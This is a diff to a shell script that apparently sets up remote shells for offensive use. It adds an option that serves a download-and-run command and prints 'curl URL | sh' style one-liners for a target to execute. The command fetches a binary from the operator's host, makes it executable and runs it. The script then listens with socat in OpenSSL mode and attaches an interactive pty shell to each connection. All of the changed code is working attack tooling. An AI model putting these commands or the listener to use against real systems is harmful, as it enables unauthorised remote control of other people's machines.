@@ -19,6 +19,9 @@ for i in "$@"; do
     --windows|-w)
         WINDOWS=true
         ;;
+    --++|--aas)
+        AAS=true
+        ;;
     --help|-h)
         HELP=true
         ;;
@@ -134,11 +137,26 @@ SHUTDOWN_URL="${URL}/shutdown"
 
 
 # LISTEN
+REMOTE_CMD=""
+if [[ "$WINDOWS" ]]; then
+    REMOTE_CMD="curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${TUNNEL_ENDPOINT}"
+else
+    REMOTE_CMD="curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${TUNNEL_ENDPOINT}"
+fi
+
+## as a Service? ie even shorter shortcut
+if [[ "$AAS" ]]; then
+    ## Write file for gitar
+    echo "${REMOTE_CMD}" > aas
+    AAS_URL="${URL}/pull/aas"
+    REMOTE_CMD="\ncurl ${AAS_URL} |sh\nsh -c \"\$(curl ${AAS_URL})\"\nsh <(curl ${AAS_URL})"
+fi
+
 echo
 if [[ "$WINDOWS" ]]; then
-    echo "(🪟) curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${TUNNEL_ENDPOINT}"
+    echo -e "(🪟) ${REMOTE_CMD}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
 else
-    echo "(🐧) curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${TUNNEL_ENDPOINT}"
+    echo -e "(🐧) ${REMOTE_CMD}"
     socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
 fi
